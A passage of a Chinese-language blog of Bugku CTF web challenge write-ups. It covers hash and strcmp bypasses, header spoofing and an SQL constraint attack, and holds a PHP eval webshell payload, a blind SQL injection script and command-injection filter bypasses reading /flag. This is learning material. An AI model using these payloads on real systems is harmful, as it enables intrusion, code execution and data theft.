    <content type="html"><![CDATA[<h4 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h4><p>提示：题目刷新几次后有提示，需要计算数值并post value。</p><ul><li>考点：爬虫复习、利用eval()直接计算string内的数字公式、利用同一个Session进行get和post请求，防止网页动态刷新计算值失效、post请求中data注意格式为{‘somevtext’：’somevalue’}、python和PHP的计算方式不太一样，可能存在计算偏差导致得不到flag，需要重复发送几次。  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;114.67.246.176:14925&#x2F;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">r &#x3D; s.get(url)</span><br><span class="line">r.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">soup&#x3D;BeautifulSoup(r.text,&#39;lxml&#39;)</span><br><span class="line">data&#x3D;soup.select(&#39;div&#39;)</span><br><span class="line">for item in data:</span><br><span class="line">    #获取原文为804134448*284526014-53361872*1933492032+466213037-393751154*4253881+1224286171-1203351395*1548147628+1689398514&#x3D;?;</span><br><span class="line">    result&#x3D;item.get_text()</span><br><span class="line"></span><br><span class="line">result1&#x3D;result[0:len(result)-3] #去掉后三位‘&#x3D;?;’</span><br><span class="line">result2 &#x3D; eval(result1) #计算数值</span><br><span class="line">result3&#x3D;&#123;&#39;value&#39;:result2&#125; #添加post请求数据格式</span><br><span class="line"></span><br><span class="line">mssg&#x3D;s.post(url, data&#x3D;result3) #利用同一个session，防止网页刷新。</span><br><span class="line"></span><br><span class="line">print(mssg.text)</span><br></pre></td></tr></table></figure></li></ul><h4 id="Web-19"><a href="#Web-19" class="headerlink" title="Web 19"></a>Web 19</h4><p>提示： OK ,now you have to post the margin what you find</p><ul><li>解题思路：刷新几次之后没有发现变化，f12看network请求，在response包header内看到base64加密的flag，解码后为‘跑的还不错，给你flag吧: MjE0Nzg1’，一开始并没有意识到后面是base64的密文，直到一次运行爬虫发现密文有=号结尾。根据其他人的解读，说margin是数字所以提示了有两次base64解密，完全没有意识到这一层，我只猜到了post数据时数据格式为{‘margin’:xxx}，不得不说这提示的语法不太行，应该删掉what，这个着实困扰了。<br>  这个解开之后就简单很多了，另一个难点是在py3里string无法直接用base64解密，需要先转换成ascii。以及解密之后的返回值为bytes，需要转换成utf-8格式再进行后续删减处理，不然有<code>b’‘</code>等噪音。  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:19877&#x2F;&#39;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line"></span><br><span class="line">r&#x3D;s.get(url).headers.get(&#39;flag&#39;)</span><br><span class="line">r1&#x3D;base64.b64decode(r.encode(&#39;ascii&#39;))</span><br><span class="line">r2&#x3D;r1.decode(&quot;utf-8&quot;)</span><br><span class="line">r3&#x3D;r2[len(r2)-8:len(r2)]</span><br><span class="line">r4&#x3D;base64.b64decode(r3.encode(&#39;ascii&#39;)).decode(&quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">print(s.post(url, data&#x3D;&#123;&#39;margin&#39;:r4&#125;).text)</span><br></pre></td></tr></table></figure></li></ul><h4 id="Web-23"><a href="#Web-23" class="headerlink" title="Web 23"></a>Web 23</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;2.php&#39;);</span><br><span class="line">$key&#x3D;&#39;flag&#123;********************************&#125;&#39;;</span><br><span class="line">$IM&#x3D; preg_match(&quot;&#x2F;key.*key.&#123;4,7&#125;key:\&#x2F;.\&#x2F;(.*key)[a-z][[:punct:]]&#x2F;i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123;</span><br><span class="line"> die(&#39;key is: &#39;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：基本上难点都在这句正则上了，外加一个trim()去掉输入值前后的空白字符。解读一下php语句，就是当id的输入值符合正则时，退出（die）并返回key。2.php在此处仅为含有该php语句的文件（highlight_file），与输入值无关。跟着这道题试验了好几个找到的在线正则工具，发现还是regex101好用。<br><code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i</code>，<code>&#123;4,7&#125;</code>表示重复前面部分4～7次，<code>[:punct:]</code>为所有的特殊字符。<br>payload：<code>keykeykkeykey:/k/keya[:punct:]</code></li></ul><h4 id="Web-24"><a href="#Web-24" class="headerlink" title="Web 24"></a>Web 24</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;</span><br><span class="line">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class="line">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">    $v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class="line">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：似曾相识的MD5相等题，此次应掏出MD5绕过笔记。strcmp(str1,str2),如果str1小于str2返回&lt;0；如果str1大于str2返回&gt;0；如果两者相等，返回0。因为是if(!xxx)返回flag，所以v3和flag相等。搜索strcmp绕过，可知当传入的类型非期望类型时，即传入值非string时，发生错误，返回0。如：数组,<code>?a[]=2</code></li></ul><h4 id="Web-25"><a href="#Web-25" class="headerlink" title="Web 25"></a>Web 25</h4><p>提示：SQL约束攻击</p><ul><li>解题思路：点开链接，发现是一个后台登录站点，先放着不管，查一下提示给的SQL约束攻击。内容也算似曾相识，之前在bug bounty的hint里面见过，也就是利用用户名长度限制，在用户名最后加上多个空白字符以及末尾一个用于绕过用户名是否已注册的对比的任意字符，那么在存储时，数据库仅存储前X位字符，导致攻击者可以取代登录目标用户。ref：<a href="https://www.freebuf.com/articles/web/124537.html">https://www.freebuf.com/articles/web/124537.html</a><br>知道了就简单了，思路是先盲猜管理员用户名，然后通过SQL约束攻击注册新帐号，取代替换原管理员帐号的密码。</li></ul><h4 id="Web-26"><a href="#Web-26" class="headerlink" title="Web 26"></a>Web 26</h4><p>提示：are you from google?</p><ul><li>解题思路：这个提示已经很明显了，直接包头加转发（referer），表示自己是从google来的就行。突然在想x-forwarded-for为啥不行，查了一下XFF必须是IP地址。</li></ul><h4 id="Web-27"><a href="#Web-27" class="headerlink" title="Web 27"></a>Web 27</h4><p>提示：<br>    1. please input a<br>    2. md5 collision</p><ul><li>解题思路：MD5碰撞，题面只有一句please input a，盲猜是输入a和某个值碰撞，那么首先试试输入数组报错法，回显<code>false!!</code>，起码证明思路应该是对的，重新查了查MD5碰撞，猜测题目是强类型不能绕过。但不知道另一个对比值要怎么做真实碰撞呢？<br>好家伙，看了看提示，发现是没给对比值源码。。。行8</li></ul><h4 id="Web-28"><a href="#Web-28" class="headerlink" title="Web 28"></a>Web 28</h4><p>提示：请从本地访问。</p><ul><li>解题思路：好的看到本地访问又稳了，直接开链接搞XFF。题目不但似曾相识还莫名的变简单了。。。<br>我一般是上burp，不过在评论里看到一个<code>curl -H &quot;X-Forwarded-For: 127.0.0.1&quot; http://114.67.246.176:18832/</code>，码住。</li></ul><h4 id="Web-29"><a href="#Web-29" class="headerlink" title="Web 29"></a>Web 29</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;flag.php&#39;);</span><br><span class="line">$_GET[&#39;id&#39;] &#x3D; urldecode($_GET[&#39;id&#39;]);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;uname&#39;]) and isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">   if ($_GET[&#39;uname&#39;] &#x3D;&#x3D; $_POST[&#39;passwd&#39;])</span><br><span class="line"></span><br><span class="line">       print &#39;passwd can not be uname.&#39;;</span><br><span class="line"></span><br><span class="line">   else if (sha1($_GET[&#39;uname&#39;]) &#x3D;&#x3D;&#x3D; sha1($_POST[&#39;passwd&#39;])&amp;($_GET[&#39;id&#39;]&#x3D;&#x3D;&#39;margin&#39;))</span><br><span class="line"></span><br><span class="line">       die(&#39;Flag: &#39;.$flag);</span><br><span class="line">   else</span><br><span class="line">       print &#39;sorry!&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：<code>urldecode，解码给出的已编码字符串中的任何%##，加号（&#39;+&#39;）被解码成一个空格字符。</code>看题目是个sha1绕过，查了一下和MD5绕过差不多，弱类型可以用数组，强类型可以用碰撞结果相同的值（<code>sha1(str) sha1(&#39;aaroZmOk&#39;) sha1(&#39;aaK1STfY&#39;) sha1(&#39;aaO8zKZF&#39;) sha1(&#39;aa3OFF9m&#39;)</code>）。</li></ul><h4 id="Web-30"><a href="#Web-30" class="headerlink" title="Web 30"></a>Web 30</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f &#x3D; trim(file_get_contents($fn));</span><br><span class="line">if ($ac &#x3D;&#x3D;&#x3D; $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：<code>extract — 从数组中将变量导入到当前的符号表。</code>不是很熟练，看了评论，是导入站点的文件并且和get输入变量对比。另一个思路file_get_contents绕过。所以有两种方式，一种是利用站点文件flag.txt，输入<code>?fn=flag.txt&amp;ac=bugku</code>，另一种是<code>?ac=bug&amp;fn=php://input</code>，post数据<code>bug</code>。</li></ul><h4 id="Web-31"><a href="#Web-31" class="headerlink" title="Web 31"></a>Web 31</h4><p>提示：好像需要管理员</p><ul><li>解题思路：一打开是个404,最下面是<code>Generated by kangle/3.5.5.</code> ，结合提示需要管理员，那就先从这个入手找找漏洞。搜了一下，控制面板管理员后台3312/admin，但是分发的虚拟机也不太能这么找后台。上sourceleakhacker扫一下，robots.txt爆出一个路径<code>Disallow: /resusl.php</code>，访问，提示<code>Warning:你不是管理员你的IP已经被记录到日志了</code>以及<code>if ($_GET[x]==$password) 此处省略1w字</code>，也就是XFF127.0.0.1并发送password，结合kangle的弱口令admin/admin，得到flag。这里发送包有XFF但password不对时显示的IP地址还是我本地址而不是127.0.0.1,差点又以为思路错了。</li></ul><h4 id="Web-32"><a href="#Web-32" class="headerlink" title="Web 32"></a>Web 32</h4><p>题目：文件上传;My name is margin,give me a image file not a php</p><ul><li>解题思路：文件上传漏洞，掏出上传fuzz试试看。<br>fuzz没过，看评论说是把multipart/form-data;修改成Content-Type: mulTipart/form-data; ，然后修改php文件为php4，竟然还有这种操作，学到了。</li></ul><h4 id="Web-33"><a href="#Web-33" class="headerlink" title="Web 33"></a>Web 33</h4><p>提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag:&#123;xxx&#125;</span><br><span class="line">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D;</span><br><span class="line"> &#x2F;&#x2F; 本人按：解密为&#125;l.&amp;W&#39;EG*B(W[(+G&#39;U-0，但这个并不是看起来的20位长度，而是算上不可见字符的38位长。所以碰到这种还是应该直接写代码而不是粘贴密文，以防万一。</span><br></pre></td></tr></table></figure><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">    $key &#x3D; md5(&#39;ISCC&#39;);</span><br><span class="line">    $x &#x3D; 0;</span><br><span class="line">    $len &#x3D; strlen($data);</span><br><span class="line">    $klen &#x3D; strlen($key);</span><br><span class="line">    for ($i&#x3D;0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; $key[$x];</span><br><span class="line">        $x+&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i&#x3D;0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .&#x3D; chr((ord($data[$i]) + ord($char[$i])) % 128);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：在线解base64的时候还没注意到，复制下来才发现还有特殊字符。<code>.=连接赋值运算符，将右边参数附加到左边的参数之后。</code>完整的看了一遍代码，发现应该是如何计算出提示中base64字符串的算法。懒得配环境，对PHP一直是只会读代码不会写应用的状态，干脆在网上找了找PHP在线运行网站<code>www.anycodes.cn</code>。试着运行了一下原算法，用不同的数字和字母输入data内容，观察运行。<br>然后根据提示中的base64推断可得data长度。<br>逆推写了一下获取data的源码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&#39;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D;&#39;;</span><br><span class="line">$str_decode &#x3D; base64_decode($str);</span><br><span class="line">$len1&#x3D;strlen($str_decode);</span><br><span class="line"></span><br><span class="line">$key &#x3D; md5(&#39;ISCC&#39;);  # 729623334f0aa2784a1599fd374c120d</span><br><span class="line">$klen &#x3D; strlen($key);</span><br><span class="line">$char &#x3D; &#39;&#39;;</span><br><span class="line">$data &#x3D; &#39;&#39;;</span><br><span class="line">for ($i&#x3D;0; $i &lt; $len1; $i++) &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; $key[$x]; # 729623334f0aa2784a1599fd374c120d729623</span><br><span class="line">        $x+&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line"># print($len1); -&gt; 38</span><br><span class="line"># print($char); -&gt; 729623334f0aa2784a1599fd374c120d729623</span><br><span class="line">for ($i&#x3D;0; $i &lt; $len1; $i++) &#123;</span><br><span class="line">        $data .&#x3D; chr((ord($str_decode[$i])+128)-ord($char[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">print($data);    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>得到结果：lag{asdqwdf[此次哔-]adwqadawd}，提示里写了Flag:{xxx}，所以把结果改成Flag{asdqwdf[此次哔-]adwqadawd}，结果正确。</li><li>总结： 难点主要在一开始完整的阅读代码理解意思，并且顺利的逆推<code>$str .= chr((ord($data[$i]) + ord($char[$i])) % 128);</code>这句代码。关于这句代码我自己写了写逆推笔记，记录整理如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ord($di)+ord($ci) &#x3D; A #简化原代码，$di&#x3D;$data[$i],$ci&#x3D;$char[$i],$str1&#x3D;$str[$i].</span><br><span class="line">$str1 &#x3D; chr((ord($di)+ord($ci)) % 128) #chr和ord为互补，所以从右边拿到左边就变成ord。</span><br><span class="line">ord($str1)&#x3D;(ord($di)+ord($ci)) % 128 #在这里简化一下得到下面。</span><br><span class="line">ord($str1)&#x3D;(A) % 128</span><br><span class="line">ord($str1)+128&#x3D;(A) #这里有一点直觉的成分，因为ord得出的值范围在0～255之间，而A为两个ord相加，所以数值范围应该在0～510,也就是A mod 128的结果在0～127之间。无法确定到底A净除了几个128的情况下，我选择先加一个128,看一下到底能不能运行。（后续发现获得$di还是要经过一个chr，所以A到底多了几个128好像没啥影响）</span><br><span class="line">ord($di) &#x3D; A-ord($ci) #从最后产出的base64密文解密可得data的长度，而char的内容只和md5(&#39;ISCC&#39;)和data长度有关，所以可以知道char的内容。</span><br><span class="line">$di &#x3D; chr(A-ord($ci)) #这里可以把原本简化的A用原内容代替回来了。</span><br><span class="line">$di &#x3D; chr((ord($str1)+128)-ord($ci)) #思路就是这样，然后根据这个写代码。</span><br></pre></td></tr></table></figure></li></ul><h4 id="Web-34"><a href="#Web-34" class="headerlink" title="Web 34"></a>Web 34</h4><p>提示：文件包含</p><ul><li>解题思路：既然是文件包含，一开始上来就先试试file=php://input(<?php phpinfo();?>)，提示NAIVE，不管，反正方向是对了，开burp传包才看到这个页面有个隐藏的upload.php，点进去发现是个上传点。结合apache的版本和PHP版本，没啥直接上传shell利用的机会。那就只能上传成jpg的格式，然后用文件包含去利用。<a href="http://114.67.246.176:14764/index.php?file=upload/202105140715558770.jpg%EF%BC%8C%E6%89%93%E5%BC%80%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E6%8F%90%E7%A4%BA%60">http://114.67.246.176:14764/index.php?file=upload/202105140715558770.jpg，打开之后发现提示`</a>_ @eval($_POST[‘shell’]);_<code>，显然是过滤了&lt;?php?&gt;，换成&lt;script&gt;。</code><script language=php>echo 'a'; eval($_POST['pass']);</script>`<br>这题不错，把我一直以来没有联合使用的两种手法彻底试了试。</li></ul><h4 id="Web-35"><a href="#Web-35" class="headerlink" title="Web 35"></a>Web 35</h4><p>提示：login按钮无法按</p><ul><li>解题思路：login按钮倒是不难解决。代码里加个<code>type=&quot;submit&quot;</code>。post完数据之后跳转回来没有啥反应，查看源码内的CSS文件，其中有写了try?32758。<code>POST /?32758 </code>之后返回源码:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$KEY&#x3D;&#39;ctf.bugku.com&#39;;</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;BUGKU&#39;];</span><br><span class="line">if(isset($_GET[&#39;32758&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>这里的关键点是<code>unserialize($cookie) === &quot;$KEY&quot;</code>，利用在线PHP，<code>$a=serialize(&#39;ctf.bugku.com&#39;)</code>，得到<code>s:13:&quot;ctf.bugku.com&quot;;</code>，在bp里添加cookie，得到flag。</li></ul><h4 id="Web-36"><a href="#Web-36" class="headerlink" title="Web 36"></a>Web 36</h4><p>提示： !,!=,=,+,-,^,%<br>      全都过滤了绝望吗？</p><ul><li>解题思路：先跑bp看看关键词屏蔽情况，or和空格过滤了，–也过滤了，替代or的||也未曾幸免,()没有过滤。参考提示，!,!=,=,+,-,^,% （构造的url转码注入）没有被过滤，那么用+替代空格，利用！=构造用户名注入，<code>amdin&#39;+‘1’！=‘2</code>，返回<code>password error</code>，也就是说这个绕过成功但没有注释掉密码。<br>这里照抄WP的盲注：ref <a href="https://wxt123.top/2021/01/22/Bugku%20Web%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing)/#Web-36">https://wxt123.top/2021/01/22/Bugku%20Web%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing)/#Web-36</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;114.67.246.176:12012&#x2F;login.php&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">        left&#x3D;32</span><br><span class="line">        right&#x3D;128</span><br><span class="line">        mid&#x3D;(left+right)&#x2F;&#x2F;2</span><br><span class="line">        while(left&lt;right):</span><br><span class="line">                payload&#x3D;&quot;admin&#39;^((ascii(mid((select(group_concat(passwd)))from(%s)))&gt;%s))^&#39;1&quot;%(i,mid)</span><br><span class="line">                data &#x3D; &#123;&#39;uname&#39;: payload, &#39;passwd&#39;: &#39;admin&#39;&#125;</span><br><span class="line">                res &#x3D; requests.post(url, data&#x3D;data)</span><br><span class="line">                if &#39;password&#39; in res.text:</span><br><span class="line">                        left&#x3D;mid+1</span><br><span class="line">                else:</span><br><span class="line">                        right&#x3D;mid</span><br><span class="line">                mid&#x3D;(left+right)&#x2F;&#x2F;2</span><br><span class="line">        if(mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;127):</span><br><span class="line">                break</span><br><span class="line">        flag&#x3D;flag+chr(mid)</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure>进去之后是个命令执行框，这里要怒翻文件包含里记下的笔记，利用&lt;代替空格，cat&lt;/flag，（加.php会被过滤）<br>再记几个可以用的方式：<ul><li>env :用于输出系统环境变量，这道题中系统环境变量中有flag；</li><li>{echo,$FLAG}：也是输出系统环境变量，但是只输出$FLAG一个变量</li><li>{cat,/flag}：绕过空格限制，读取根目录下flag文件；</li><li>cat&lt;/flag：绕过空格限制，</li><li>cat&lt;&gt;/flag：绕过空格限制；</li><li><code>a=$‘\x20/flag’&amp;&amp;cat$a</code>：\x20转换为字符串就是空格;<br>再做个关于fuzz后台登录密码的注入笔记：</li><li>判断密码长度：uname=admin’^(length(passwd)=32)^’，逐一递增，并根据32位猜测密码为MD5。</li><li>判断密码每一位字符：uname=admin’^(ascii(substr((passwd)from(1))=52)^’</li></ul></li></ul><h4 id="Web-37"><a href="#Web-37" class="headerlink" title="Web 37"></a>Web 37</h4><p>提示：union,命令执行</p><ul><li>解题思路：<br>(做了两个月crypto回来发现web题没有了好多？)</li></ul><h4 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h4><ul><li>解题思路：速查SSTI是什么。<code>SSTI 即服务端模板注入攻击，服务端接受用户输入，将其作为 Web 应用模板的一部分，渲染编译后执行了恶意内容，导致敏感信息泄露、代码执行等。</code><br>差不多看懂了，F12看一眼页面源码，源码里有提示 <code>&lt;!-- You know, in the flask, We often set a secret_key variable.--&gt;</code>。<br>这里执行IP/?flag=4可以执行，证明有渲染漏洞。按照提示，用config查看SECRET_KEY值。（/?flag=）</li></ul><h4 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" 